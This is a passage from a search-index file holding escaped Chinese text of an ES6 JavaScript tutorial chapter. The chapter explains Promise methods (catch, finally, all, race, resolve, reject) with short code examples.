\u5185\u90e8\u53d1\u751f\u7684\u9519\u8bef\u3002<code>catch</code>\u65b9\u6cd5\u8fd4\u56de\u7684\u8fd8\u662f\u4e00\u4e2a Promise \u5bf9\u8c61\uff0c\u56e0\u6b64\u540e\u9762\u8fd8\u53ef\u4ee5\u63a5\u7740\u8c03\u7528<code>then</code>\u65b9\u6cd5\u3002</p> <pre><code>const someAsyncThing = function() {\n  return new Promise(function(resolve, reject) {\n    // \u4e0b\u9762\u4e00\u884c\u4f1a\u62a5\u9519\uff0c\u56e0\u4e3ax\u6ca1\u6709\u58f0\u660e\n    resolve(x + 2);\n  });\n};\n\nsomeAsyncThing().catch(function(error) {\n  console.log('oh no', error);\n}).then(function() {\n  console.log('carry on');\n});\n// oh no [ReferenceError: x is not defined]\n// carry on\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u8fd0\u884c\u5b8c<code>catch</code>\u65b9\u6cd5\u6307\u5b9a\u7684\u56de\u8c03\u51fd\u6570\uff0c\u4f1a\u63a5\u7740\u8fd0\u884c\u540e\u9762\u90a3\u4e2a<code>then</code>\u65b9\u6cd5\u6307\u5b9a\u7684\u56de\u8c03\u51fd\u6570\u3002\u5982\u679c\u6ca1\u6709\u62a5\u9519\uff0c\u5219\u4f1a\u8df3\u8fc7<code>catch</code>\u65b9\u6cd5\u3002</p> <pre><code>Promise.resolve()\n.catch(function(error) {\n  console.log('oh no', error);\n})\n.then(function() {\n  console.log('carry on');\n});\n// carry on\n</code></pre> <p>\u4e0a\u9762\u7684\u4ee3\u7801\u56e0\u4e3a\u6ca1\u6709\u62a5\u9519\uff0c\u8df3\u8fc7\u4e86<code>catch</code>\u65b9\u6cd5\uff0c\u76f4\u63a5\u6267\u884c\u540e\u9762\u7684<code>then</code>\u65b9\u6cd5\u3002\u6b64\u65f6\uff0c\u8981\u662f<code>then</code>\u65b9\u6cd5\u91cc\u9762\u62a5\u9519\uff0c\u5c31\u4e0e\u524d\u9762\u7684<code>catch</code>\u65e0\u5173\u4e86\u3002</p> <p><code>catch</code>\u65b9\u6cd5\u4e4b\u4e2d\uff0c\u8fd8\u80fd\u518d\u629b\u51fa\u9519\u8bef\u3002</p> <pre><code>const someAsyncThing = function() {\n  return new Promise(function(resolve, reject) {\n    // \u4e0b\u9762\u4e00\u884c\u4f1a\u62a5\u9519\uff0c\u56e0\u4e3ax\u6ca1\u6709\u58f0\u660e\n    resolve(x + 2);\n  });\n};\n\nsomeAsyncThing().then(function() {\n  return someOtherAsyncThing();\n}).catch(function(error) {\n  console.log('oh no', error);\n  // \u4e0b\u9762\u4e00\u884c\u4f1a\u62a5\u9519\uff0c\u56e0\u4e3a y \u6ca1\u6709\u58f0\u660e\n  y + 2;\n}).then(function() {\n  console.log('carry on');\n});\n// oh no [ReferenceError: x is not defined]\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>catch</code>\u65b9\u6cd5\u629b\u51fa\u4e00\u4e2a\u9519\u8bef\uff0c\u56e0\u4e3a\u540e\u9762\u6ca1\u6709\u522b\u7684<code>catch</code>\u65b9\u6cd5\u4e86\uff0c\u5bfc\u81f4\u8fd9\u4e2a\u9519\u8bef\u4e0d\u4f1a\u88ab\u6355\u83b7\uff0c\u4e5f\u4e0d\u4f1a\u4f20\u9012\u5230\u5916\u5c42\u3002\u5982\u679c\u6539\u5199\u4e00\u4e0b\uff0c\u7ed3\u679c\u5c31\u4e0d\u4e00\u6837\u4e86\u3002</p> <pre><code>someAsyncThing().then(function() {\n  return someOtherAsyncThing();\n}).catch(function(error) {\n  console.log('oh no', error);\n  // \u4e0b\u9762\u4e00\u884c\u4f1a\u62a5\u9519\uff0c\u56e0\u4e3ay\u6ca1\u6709\u58f0\u660e\n  y + 2;\n}).catch(function(error) {\n  console.log('carry on', error);\n});\n// oh no [ReferenceError: x is not defined]\n// carry on [ReferenceError: y is not defined]\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u7b2c\u4e8c\u4e2a<code>catch</code>\u65b9\u6cd5\u7528\u6765\u6355\u83b7\u524d\u4e00\u4e2a<code>catch</code>\u65b9\u6cd5\u629b\u51fa\u7684\u9519\u8bef\u3002</p>"},{"location":"ebook-JSES6-RYF/16-Promise/#promiseprototypefinally","title":"Promise.prototype.finally()","text":"<p><code>finally</code>\u65b9\u6cd5\u7528\u4e8e\u6307\u5b9a\u4e0d\u7ba1 Promise \u5bf9\u8c61\u6700\u540e\u72b6\u6001\u5982\u4f55\uff0c\u90fd\u4f1a\u6267\u884c\u7684\u64cd\u4f5c\u3002\u8be5\u65b9\u6cd5\u662f ES2018 \u5f15\u5165\u6807\u51c6\u7684\u3002</p> <pre><code>promise\n.then(result =&gt; {\u00b7\u00b7\u00b7})\n.catch(error =&gt; {\u00b7\u00b7\u00b7})\n.finally(() =&gt; {\u00b7\u00b7\u00b7});\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u4e0d\u7ba1<code>promise</code>\u6700\u540e\u7684\u72b6\u6001\uff0c\u5728\u6267\u884c\u5b8c<code>then</code>\u6216<code>catch</code>\u6307\u5b9a\u7684\u56de\u8c03\u51fd\u6570\u4ee5\u540e\uff0c\u90fd\u4f1a\u6267\u884c<code>finally</code>\u65b9\u6cd5\u6307\u5b9a\u7684\u56de\u8c03\u51fd\u6570\u3002</p> <p>\u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\uff0c\u670d\u52a1\u5668\u4f7f\u7528 Promise \u5904\u7406\u8bf7\u6c42\uff0c\u7136\u540e\u4f7f\u7528<code>finally</code>\u65b9\u6cd5\u5173\u6389\u670d\u52a1\u5668\u3002</p> <pre><code>server.listen(port)\n  .then(function () {\n    // ...\n  })\n  .finally(server.stop);\n</code></pre> <p><code>finally</code>\u65b9\u6cd5\u7684\u56de\u8c03\u51fd\u6570\u4e0d\u63a5\u53d7\u4efb\u4f55\u53c2\u6570\uff0c\u8fd9\u610f\u5473\u7740\u6ca1\u6709\u529e\u6cd5\u77e5\u9053\uff0c\u524d\u9762\u7684 Promise \u72b6\u6001\u5230\u5e95\u662f<code>fulfilled</code>\u8fd8\u662f<code>rejected</code>\u3002\u8fd9\u8868\u660e\uff0c<code>finally</code>\u65b9\u6cd5\u91cc\u9762\u7684\u64cd\u4f5c\uff0c\u5e94\u8be5\u662f\u4e0e\u72b6\u6001\u65e0\u5173\u7684\uff0c\u4e0d\u4f9d\u8d56\u4e8e Promise \u7684\u6267\u884c\u7ed3\u679c\u3002</p> <p><code>finally</code>\u672c\u8d28\u4e0a\u662f<code>then</code>\u65b9\u6cd5\u7684\u7279\u4f8b\u3002</p> <pre><code>promise\n.finally(() =&gt; {\n  // \u8bed\u53e5\n});\n\n// \u7b49\u540c\u4e8e\npromise\n.then(\n  result =&gt; {\n    // \u8bed\u53e5\n    return result;\n  },\n  error =&gt; {\n    // \u8bed\u53e5\n    throw error;\n  }\n);\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5982\u679c\u4e0d\u4f7f\u7528<code>finally</code>\u65b9\u6cd5\uff0c\u540c\u6837\u7684\u8bed\u53e5\u9700\u8981\u4e3a\u6210\u529f\u548c\u5931\u8d25\u4e24\u79cd\u60c5\u51b5\u5404\u5199\u4e00\u6b21\u3002\u6709\u4e86<code>finally</code>\u65b9\u6cd5\uff0c\u5219\u53ea\u9700\u8981\u5199\u4e00\u6b21\u3002</p> <p>\u5b83\u7684\u5b9e\u73b0\u4e5f\u5f88\u7b80\u5355\u3002</p> <pre><code>Promise.prototype.finally = function (callback) {\n  let P = this.constructor;\n  return this.then(\n    value  =&gt; P.resolve(callback()).then(() =&gt; value),\n    reason =&gt; P.resolve(callback()).then(() =&gt; { throw reason })\n  );\n};\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u4e0d\u7ba1\u524d\u9762\u7684 Promise \u662f<code>fulfilled</code>\u8fd8\u662f<code>rejected</code>\uff0c\u90fd\u4f1a\u6267\u884c\u56de\u8c03\u51fd\u6570<code>callback</code>\u3002</p> <p>\u4ece\u4e0a\u9762\u7684\u5b9e\u73b0\u8fd8\u53ef\u4ee5\u770b\u5230\uff0c<code>finally</code>\u65b9\u6cd5\u603b\u662f\u4f1a\u8fd4\u56de\u539f\u6765\u7684\u503c\u3002</p> <pre><code>// resolve \u7684\u503c\u662f undefined\nPromise.resolve(2).then(() =&gt; {}, () =&gt; {})\n\n// resolve \u7684\u503c\u662f 2\nPromise.resolve(2).finally(() =&gt; {})\n\n// reject \u7684\u503c\u662f undefined\nPromise.reject(3).then(() =&gt; {}, () =&gt; {})\n\n// reject \u7684\u503c\u662f 3\nPromise.reject(3).finally(() =&gt; {})\n</code></pre>"},{"location":"ebook-JSES6-RYF/16-Promise/#promiseall","title":"Promise.all()","text":"<p><code>Promise.all</code>\u65b9\u6cd5\u7528\u4e8e\u5c06\u591a\u4e2a Promise \u5b9e\u4f8b\uff0c\u5305\u88c5\u6210\u4e00\u4e2a\u65b0\u7684 Promise \u5b9e\u4f8b\u3002</p> <pre><code>const p = Promise.all([p1, p2, p3]);\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>Promise.all</code>\u65b9\u6cd5\u63a5\u53d7\u4e00\u4e2a\u6570\u7ec4\u4f5c\u4e3a\u53c2\u6570\uff0c<code>p1</code>\u3001<code>p2</code>\u3001<code>p3</code>\u90fd\u662f Promise \u5b9e\u4f8b\uff0c\u5982\u679c\u4e0d\u662f\uff0c\u5c31\u4f1a\u5148\u8c03\u7528\u4e0b\u9762\u8bb2\u5230\u7684<code>Promise.resolve</code>\u65b9\u6cd5\uff0c\u5c06\u53c2\u6570\u8f6c\u4e3a Promise \u5b9e\u4f8b\uff0c\u518d\u8fdb\u4e00\u6b65\u5904\u7406\u3002\uff08<code>Promise.all</code>\u65b9\u6cd5\u7684\u53c2\u6570\u53ef\u4ee5\u4e0d\u662f\u6570\u7ec4\uff0c\u4f46\u5fc5\u987b\u5177\u6709 Iterator \u63a5\u53e3\uff0c\u4e14\u8fd4\u56de\u7684\u6bcf\u4e2a\u6210\u5458\u90fd\u662f Promise \u5b9e\u4f8b\u3002\uff09</p> <p><code>p</code>\u7684\u72b6\u6001\u7531<code>p1</code>\u3001<code>p2</code>\u3001<code>p3</code>\u51b3\u5b9a\uff0c\u5206\u6210\u4e24\u79cd\u60c5\u51b5\u3002</p> <p>\uff081\uff09\u53ea\u6709<code>p1</code>\u3001<code>p2</code>\u3001<code>p3</code>\u7684\u72b6\u6001\u90fd\u53d8\u6210<code>fulfilled</code>\uff0c<code>p</code>\u7684\u72b6\u6001\u624d\u4f1a\u53d8\u6210<code>fulfilled</code>\uff0c\u6b64\u65f6<code>p1</code>\u3001<code>p2</code>\u3001<code>p3</code>\u7684\u8fd4\u56de\u503c\u7ec4\u6210\u4e00\u4e2a\u6570\u7ec4\uff0c\u4f20\u9012\u7ed9<code>p</code>\u7684\u56de\u8c03\u51fd\u6570\u3002</p> <p>\uff082\uff09\u53ea\u8981<code>p1</code>\u3001<code>p2</code>\u3001<code>p3</code>\u4e4b\u4e2d\u6709\u4e00\u4e2a\u88ab<code>rejected</code>\uff0c<code>p</code>\u7684\u72b6\u6001\u5c31\u53d8\u6210<code>rejected</code>\uff0c\u6b64\u65f6\u7b2c\u4e00\u4e2a\u88ab<code>reject</code>\u7684\u5b9e\u4f8b\u7684\u8fd4\u56de\u503c\uff0c\u4f1a\u4f20\u9012\u7ed9<code>p</code>\u7684\u56de\u8c03\u51fd\u6570\u3002</p> <p>\u4e0b\u9762\u662f\u4e00\u4e2a\u5177\u4f53\u7684\u4f8b\u5b50\u3002</p> <pre><code>// \u751f\u6210\u4e00\u4e2aPromise\u5bf9\u8c61\u7684\u6570\u7ec4\nconst promises = [2, 3, 5, 7, 11, 13].map(function (id) {\n  return getJSON('/post/' + id + \".json\");\n});\n\nPromise.all(promises).then(function (posts) {\n  // ...\n}).catch(function(reason){\n  // ...\n});\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>promises</code>\u662f\u5305\u542b 6 \u4e2a Promise \u5b9e\u4f8b\u7684\u6570\u7ec4\uff0c\u53ea\u6709\u8fd9 6 \u4e2a\u5b9e\u4f8b\u7684\u72b6\u6001\u90fd\u53d8\u6210<code>fulfilled</code>\uff0c\u6216\u8005\u5176\u4e2d\u6709\u4e00\u4e2a\u53d8\u4e3a<code>rejected</code>\uff0c\u624d\u4f1a\u8c03\u7528<code>Promise.all</code>\u65b9\u6cd5\u540e\u9762\u7684\u56de\u8c03\u51fd\u6570\u3002</p> <p>\u4e0b\u9762\u662f\u53e6\u4e00\u4e2a\u4f8b\u5b50\u3002</p> <pre><code>const databasePromise = connectDatabase();\nconst booksPromise = databasePromise.then(findAllBooks);\nconst userPromise = databasePromise.then(getCurrentUser);\n\nPromise.all([\n  booksPromise,\n  userPromise\n])\n.then(([books, user]) =&gt; pickTopRecommendations(books, user));\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>booksPromise</code>\u548c<code>userPromise</code>\u662f\u4e24\u4e2a\u5f02\u6b65\u64cd\u4f5c\uff0c\u53ea\u6709\u7b49\u5230\u5b83\u4eec\u7684\u7ed3\u679c\u90fd\u8fd4\u56de\u4e86\uff0c\u624d\u4f1a\u89e6\u53d1<code>pickTopRecommendations</code>\u8fd9\u4e2a\u56de\u8c03\u51fd\u6570\u3002</p> <p>\u6ce8\u610f\uff0c\u5982\u679c\u4f5c\u4e3a\u53c2\u6570\u7684 Promise \u5b9e\u4f8b\uff0c\u81ea\u5df1\u5b9a\u4e49\u4e86<code>catch</code>\u65b9\u6cd5\uff0c\u90a3\u4e48\u5b83\u4e00\u65e6\u88ab<code>rejected</code>\uff0c\u5e76\u4e0d\u4f1a\u89e6\u53d1<code>Promise.all()</code>\u7684<code>catch</code>\u65b9\u6cd5\u3002</p> <pre><code>const p1 = new Promise((resolve, reject) =&gt; {\n  resolve('hello');\n})\n.then(result =&gt; result)\n.catch(e =&gt; e);\n\nconst p2 = new Promise((resolve, reject) =&gt; {\n  throw new Error('\u62a5\u9519\u4e86');\n})\n.then(result =&gt; result)\n.catch(e =&gt; e);\n\nPromise.all([p1, p2])\n.then(result =&gt; console.log(result))\n.catch(e =&gt; console.log(e));\n// [\"hello\", Error: \u62a5\u9519\u4e86]\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>p1</code>\u4f1a<code>resolved</code>\uff0c<code>p2</code>\u9996\u5148\u4f1a<code>rejected</code>\uff0c\u4f46\u662f<code>p2</code>\u6709\u81ea\u5df1\u7684<code>catch</code>\u65b9\u6cd5\uff0c\u8be5\u65b9\u6cd5\u8fd4\u56de\u7684\u662f\u4e00\u4e2a\u65b0\u7684 Promise \u5b9e\u4f8b\uff0c<code>p2</code>\u6307\u5411\u7684\u5b9e\u9645\u4e0a\u662f\u8fd9\u4e2a\u5b9e\u4f8b\u3002\u8be5\u5b9e\u4f8b\u6267\u884c\u5b8c<code>catch</code>\u65b9\u6cd5\u540e\uff0c\u4e5f\u4f1a\u53d8\u6210<code>resolved</code>\uff0c\u5bfc\u81f4<code>Promise.all()</code>\u65b9\u6cd5\u53c2\u6570\u91cc\u9762\u7684\u4e24\u4e2a\u5b9e\u4f8b\u90fd\u4f1a<code>resolved</code>\uff0c\u56e0\u6b64\u4f1a\u8c03\u7528<code>then</code>\u65b9\u6cd5\u6307\u5b9a\u7684\u56de\u8c03\u51fd\u6570\uff0c\u800c\u4e0d\u4f1a\u8c03\u7528<code>catch</code>\u65b9\u6cd5\u6307\u5b9a\u7684\u56de\u8c03\u51fd\u6570\u3002</p> <p>\u5982\u679c<code>p2</code>\u6ca1\u6709\u81ea\u5df1\u7684<code>catch</code>\u65b9\u6cd5\uff0c\u5c31\u4f1a\u8c03\u7528<code>Promise.all()</code>\u7684<code>catch</code>\u65b9\u6cd5\u3002</p> <pre><code>const p1 = new Promise((resolve, reject) =&gt; {\n  resolve('hello');\n}).then(result =&gt; result);\n\nconst p2 = new Promise((resolve, reject) =&gt; {\n  throw new Error('\u62a5\u9519\u4e86');\n})\n.then(result =&gt; result);\n\nPromise.all([p1, p2])\n.then(result =&gt; console.log(result))\n.catch(e =&gt; console.log(e));\n// Error: \u62a5\u9519\u4e86\n</code></pre>"},{"location":"ebook-JSES6-RYF/16-Promise/#promiserace","title":"Promise.race()","text":"<p><code>Promise.race</code>\u65b9\u6cd5\u540c\u6837\u662f==\u5c06\u591a\u4e2a Promise \u5b9e\u4f8b\uff0c\u5305\u88c5\u6210\u4e00\u4e2a\u65b0\u7684 Promise \u5b9e\u4f8b\u3002==</p> <pre><code>const p = Promise.race([p1, p2, p3]);\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u53ea\u8981<code>p1</code>\u3001<code>p2</code>\u3001<code>p3</code>\u4e4b\u4e2d\u6709\u4e00\u4e2a\u5b9e\u4f8b\u7387\u5148\u6539\u53d8\u72b6\u6001\uff0c<code>p</code>\u7684\u72b6\u6001\u5c31\u8ddf\u7740\u6539\u53d8\u3002\u90a3\u4e2a\u7387\u5148\u6539\u53d8\u7684 Promise \u5b9e\u4f8b\u7684\u8fd4\u56de\u503c\uff0c\u5c31\u4f20\u9012\u7ed9<code>p</code>\u7684\u56de\u8c03\u51fd\u6570\u3002</p> <p><code>Promise.race</code>\u65b9\u6cd5\u7684\u53c2\u6570\u4e0e<code>Promise.all</code>\u65b9\u6cd5\u4e00\u6837\uff0c\u5982\u679c\u4e0d\u662f Promise \u5b9e\u4f8b\uff0c\u5c31\u4f1a\u5148\u8c03\u7528\u4e0b\u9762\u8bb2\u5230\u7684<code>Promise.resolve</code>\u65b9\u6cd5\uff0c\u5c06\u53c2\u6570\u8f6c\u4e3a Promise \u5b9e\u4f8b\uff0c\u518d\u8fdb\u4e00\u6b65\u5904\u7406\u3002</p> <p>\u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\uff0c\u5982\u679c\u6307\u5b9a\u65f6\u95f4\u5185\u6ca1\u6709\u83b7\u5f97\u7ed3\u679c\uff0c\u5c31\u5c06 Promise \u7684\u72b6\u6001\u53d8\u4e3a<code>reject</code>\uff0c\u5426\u5219\u53d8\u4e3a<code>resolve</code>\u3002</p> <pre><code>const p = Promise.race([\n  fetch('/resource-that-may-take-a-while'),\n  new Promise(function (resolve, reject) {\n    setTimeout(() =&gt; reject(new Error('request timeout')), 5000)\n  })\n]);\n\np\n.then(console.log)\n.catch(console.error);\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5982\u679c 5 \u79d2\u4e4b\u5185<code>fetch</code>\u65b9\u6cd5\u65e0\u6cd5\u8fd4\u56de\u7ed3\u679c\uff0c\u53d8\u91cf<code>p</code>\u7684\u72b6\u6001\u5c31\u4f1a\u53d8\u4e3a<code>rejected</code>\uff0c\u4ece\u800c\u89e6\u53d1<code>catch</code>\u65b9\u6cd5\u6307\u5b9a\u7684\u56de\u8c03\u51fd\u6570\u3002</p>"},{"location":"ebook-JSES6-RYF/16-Promise/#promiseresolve","title":"Promise.resolve()","text":"<p>\u6709\u65f6\u9700\u8981==\u5c06\u73b0\u6709\u5bf9\u8c61\u8f6c\u4e3a Promise \u5bf9\u8c61==\uff0c<code>Promise.resolve</code>\u65b9\u6cd5\u5c31\u8d77\u5230\u8fd9\u4e2a\u4f5c\u7528\u3002</p> <pre><code>const jsPromise = Promise.resolve($.ajax('/whatever.json'));\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u5c06 jQuery \u751f\u6210\u7684<code>deferred</code>\u5bf9\u8c61\uff0c\u8f6c\u4e3a\u4e00\u4e2a\u65b0\u7684 Promise \u5bf9\u8c61\u3002</p> <p><code>Promise.resolve</code>\u7b49\u4ef7\u4e8e\u4e0b\u9762\u7684\u5199\u6cd5\u3002</p> <pre><code>Promise.resolve('foo')\n// \u7b49\u4ef7\u4e8e\nnew Promise(resolve =&gt; resolve('foo'))\n</code></pre> <p><code>Promise.resolve</code>\u65b9\u6cd5\u7684\u53c2\u6570\u5206\u6210\u56db\u79cd\u60c5\u51b5\u3002</p> <p>\uff081\uff09\u53c2\u6570\u662f\u4e00\u4e2a Promise \u5b9e\u4f8b</p> <p>\u5982\u679c\u53c2\u6570\u662f Promise \u5b9e\u4f8b\uff0c\u90a3\u4e48<code>Promise.resolve</code>\u5c06\u4e0d\u505a\u4efb\u4f55\u4fee\u6539\u3001\u539f\u5c01\u4e0d\u52a8\u5730\u8fd4\u56de\u8fd9\u4e2a\u5b9e\u4f8b\u3002</p> <p>\uff082\uff09\u53c2\u6570\u662f\u4e00\u4e2athenable\u5bf9\u8c61</p> <p><code>thenable</code>\u5bf9\u8c61\u6307\u7684\u662f\u5177\u6709<code>then</code>\u65b9\u6cd5\u7684\u5bf9\u8c61\uff0c\u6bd4\u5982\u4e0b\u9762\u8fd9\u4e2a\u5bf9\u8c61\u3002</p> <pre><code>let thenable = {\n  then: function(resolve, reject) {\n    resolve(42);\n  }\n};\n</code></pre> <p><code>Promise.resolve</code>\u65b9\u6cd5\u4f1a\u5c06\u8fd9\u4e2a\u5bf9\u8c61\u8f6c\u4e3a Promise \u5bf9\u8c61\uff0c\u7136\u540e\u5c31\u7acb\u5373\u6267\u884c<code>thenable</code>\u5bf9\u8c61\u7684<code>then</code>\u65b9\u6cd5\u3002</p> <pre><code>let thenable = {\n  then: function(resolve, reject) {\n    resolve(42);\n  }\n};\n\nlet p1 = Promise.resolve(thenable);\np1.then(function(value) {\n  console.log(value);  // 42\n});\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>thenable</code>\u5bf9\u8c61\u7684<code>then</code>\u65b9\u6cd5\u6267\u884c\u540e\uff0c\u5bf9\u8c61<code>p1</code>\u7684\u72b6\u6001\u5c31\u53d8\u4e3a<code>resolved</code>\uff0c\u4ece\u800c\u7acb\u5373\u6267\u884c\u6700\u540e\u90a3\u4e2a<code>then</code>\u65b9\u6cd5\u6307\u5b9a\u7684\u56de\u8c03\u51fd\u6570\uff0c\u8f93\u51fa 42\u3002</p> <p>\uff083\uff09\u53c2\u6570\u4e0d\u662f\u5177\u6709then\u65b9\u6cd5\u7684\u5bf9\u8c61\uff0c\u6216\u6839\u672c\u5c31\u4e0d\u662f\u5bf9\u8c61</p> <p>\u5982\u679c\u53c2\u6570\u662f\u4e00\u4e2a\u539f\u59cb\u503c\uff0c\u6216\u8005\u662f\u4e00\u4e2a\u4e0d\u5177\u6709<code>then</code>\u65b9\u6cd5\u7684\u5bf9\u8c61\uff0c\u5219<code>Promise.resolve</code>\u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u65b0\u7684 Promise \u5bf9\u8c61\uff0c\u72b6\u6001\u4e3a<code>resolved</code>\u3002</p> <pre><code>const p = Promise.resolve('Hello');\n\np.then(function (s){\n  console.log(s)\n});\n// Hello\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u751f\u6210\u4e00\u4e2a\u65b0\u7684 Promise \u5bf9\u8c61\u7684\u5b9e\u4f8b<code>p</code>\u3002\u7531\u4e8e\u5b57\u7b26\u4e32<code>Hello</code>\u4e0d\u5c5e\u4e8e\u5f02\u6b65\u64cd\u4f5c\uff08\u5224\u65ad\u65b9\u6cd5\u662f\u5b57\u7b26\u4e32\u5bf9\u8c61\u4e0d\u5177\u6709 then \u65b9\u6cd5\uff09\uff0c\u8fd4\u56de Promise \u5b9e\u4f8b\u7684\u72b6\u6001\u4ece\u4e00\u751f\u6210\u5c31\u662f<code>resolved</code>\uff0c\u6240\u4ee5\u56de\u8c03\u51fd\u6570\u4f1a\u7acb\u5373\u6267\u884c\u3002<code>Promise.resolve</code>\u65b9\u6cd5\u7684\u53c2\u6570\uff0c\u4f1a\u540c\u65f6\u4f20\u7ed9\u56de\u8c03\u51fd\u6570\u3002</p> <p>\uff084\uff09\u4e0d\u5e26\u6709\u4efb\u4f55\u53c2\u6570</p> <p><code>Promise.resolve()</code>\u65b9\u6cd5\u5141\u8bb8\u8c03\u7528\u65f6\u4e0d\u5e26\u53c2\u6570\uff0c\u76f4\u63a5\u8fd4\u56de\u4e00\u4e2a<code>resolved</code>\u72b6\u6001\u7684 Promise \u5bf9\u8c61\u3002</p> <p>\u6240\u4ee5\uff0c\u5982\u679c\u5e0c\u671b\u5f97\u5230\u4e00\u4e2a Promise \u5bf9\u8c61\uff0c\u6bd4\u8f83\u65b9\u4fbf\u7684\u65b9\u6cd5\u5c31\u662f\u76f4\u63a5\u8c03\u7528<code>Promise.resolve()</code>\u65b9\u6cd5\u3002</p> <pre><code>const p = Promise.resolve();\n\np.then(function () {\n  // ...\n});\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u7684\u53d8\u91cf<code>p</code>\u5c31\u662f\u4e00\u4e2a Promise \u5bf9\u8c61\u3002</p> <p>\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u7acb\u5373<code>resolve()</code>\u7684 Promise \u5bf9\u8c61\uff0c\u662f\u5728\u672c\u8f6e\u201c\u4e8b\u4ef6\u5faa\u73af\u201d\uff08event loop\uff09\u7684\u7ed3\u675f\u65f6\u6267\u884c\uff0c\u800c\u4e0d\u662f\u5728\u4e0b\u4e00\u8f6e\u201c\u4e8b\u4ef6\u5faa\u73af\u201d\u7684\u5f00\u59cb\u65f6\u3002</p> <pre><code>setTimeout(function () {\n  console.log('three');\n}, 0);\n\nPromise.resolve().then(function () {\n  console.log('two');\n});\n\nconsole.log('one');\n\n// one\n// two\n// three\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>setTimeout(fn, 0)</code>\u5728\u4e0b\u4e00\u8f6e\u201c\u4e8b\u4ef6\u5faa\u73af\u201d\u5f00\u59cb\u65f6\u6267\u884c\uff0c<code>Promise.resolve()</code>\u5728\u672c\u8f6e\u201c\u4e8b\u4ef6\u5faa\u73af\u201d\u7ed3\u675f\u65f6\u6267\u884c\uff0c<code>console.log('one')</code>\u5219\u662f\u7acb\u5373\u6267\u884c\uff0c\u56e0\u6b64\u6700\u5148\u8f93\u51fa\u3002</p>"},{"location":"ebook-JSES6-RYF/16-Promise/#promisereject","title":"Promise.reject()","text":"<p><code>Promise.reject(reason)</code>\u65b9\u6cd5\u4e5f\u4f1a\u8fd4\u56de\u4e00\u4e2a\u65b0\u7684 Promise \u5b9e\u4f8b\uff0c\u8be5\u5b9e\u4f8b\u7684\u72b6\u6001\u4e3a<code>rejected</code>\u3002</p> <pre><code>const p = Promise.reject('\u51fa\u9519\u4e86');\n// \u7b49\u540c\u4e8e\nconst p = new Promise((resolve, reject) =&gt; reject('\u51fa\u9519\u4e86'))\n\np.then(null, function (s) {\n  console.log(s)\n});\n// \u51fa\u9519\u4e86\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u751f\u6210\u4e00\u4e2a Promise \u5bf9\u8c61\u7684\u5b9e\u4f8b<code>p</code>\uff0c\u72b6\u6001\u4e3a<code>rejected</code>\uff0c\u56de\u8c03\u51fd\u6570\u4f1a\u7acb\u5373\u6267\u884c\u3002</p> <p>\u6ce8\u610f\uff0c<code>Promise.reject()</code>\u65b9\u6cd5\u7684\u53c2\u6570\uff0c\u4f1a\u539f\u5c01\u4e0d\u52a8\u5730\u4f5c\u4e3a<code>reject</code>\u7684\u7406\u7531\uff0c\u53d8\u6210\u540e\u7eed\u65b9\u6cd5\u7684\u53c2\u6570\u3002\u8fd9\u4e00\u70b9\u4e0e<code>Promise.resolve</code>\u65b9\u6cd5\u4e0d\u4e00\u81f4\u3002</p> <pre><code>const thenable = {\n  then(resolve, reject) {\n    reject('\u51fa\u9519\u4e86');\n  }\n};\n\nPromise.reject(thenable)\n.catch(e =&gt; {\n  console.log(e === thenable)\n})\n// true\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>Promise.reject</code>\u65b9\u6cd5\u7684\u53c2\u6570\u662f\u4e00\u4e2a<code>thenable</code>\u5bf9\u8c61\uff0c\u6267\u884c\u4ee5\u540e\uff0c\u540e\u9762<code>catch</code>\u65b9\u6cd5\u7684\u53c2\u6570\u4e0d\u662f<code>reject</code>\u629b\u51fa\u7684\u201c\u51fa\u9519\u4e86\u201d\u8fd9\u4e2a\u5b57\u7b26\u4e32\uff0c\u800c\u662f<code>thenable</code>\u5bf9\u8c61\u3002</p>"},{"location":"ebook-JSES6-RYF/16-Promise/#_3","title":"\u5e94\u7528","text":""},{"location":"ebook-JSES6-RYF/16-Promise/#_4","title":"\u52a0\u8f7d\u56fe\u7247","text":"<p>\u6211\u4eec\u53ef\u4ee5\u5c06\u56fe\u7247\u7684\u52a0\u8f7d\u5199\u6210\u4e00\u4e2a<code>Promise</code>\uff0c\u4e00\u65e6\u52a0\u8f7d\u5b8c\u6210\uff0c<code>Promise</code>\u7684\u72b6\u6001\u5c31\u53d1\u751f\u53d8\u5316\u3002</p> <pre><code>const preloadImage = function (path) {\n  return new Promise(function (resolve, reject) {\n    const image = new Image();\n    image.onload  = resolve;\n    image.onerror = reject;\n    image.src = path;\n  });\n};\n</code></pre>"},{"location":"ebook-JSES6-RYF/16-Promise/#generator-promise","title":"Generator \u51fd\u6570\u4e0e Promise \u7684\u7ed3\u5408","text":"<p>\u4f7f\u7528 Generator 